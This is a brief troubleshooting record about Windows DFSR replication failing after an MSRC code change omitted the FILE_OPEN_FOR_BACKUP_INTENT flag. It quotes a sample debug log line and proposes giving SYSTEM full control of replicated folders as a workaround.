rootCause: The MSRC added a code check, but it is not passing in the FILE_OPEN_FOR_BACKUP_INTENT flag on the NtCreateFile API call.  So, when SYSTEM does not have permissions in the replicated folders it will fail.  DFSR Debug log files will have lines like the following: 127107 20240705 08:27:46.984 12892 MEET  1438 Meet::Install -> WAIT Error processing update. updateName:folderfilename uid:{DB6C9EDA-47C7-4BF6-AD8C-FE446E9D9DD2}-v39822592 gvsn:{DB6C9EDA-47C7-4BF6-AD8C-FE446E9D9DD2}-v398
solution: Possible workaround would be to give SYSTEM full control permissions in the replicated folder group.  Downside to this would be that such a change would generate replication traffic depending on how large the data set is and if there are any subfolders that also do not allow inheritance.
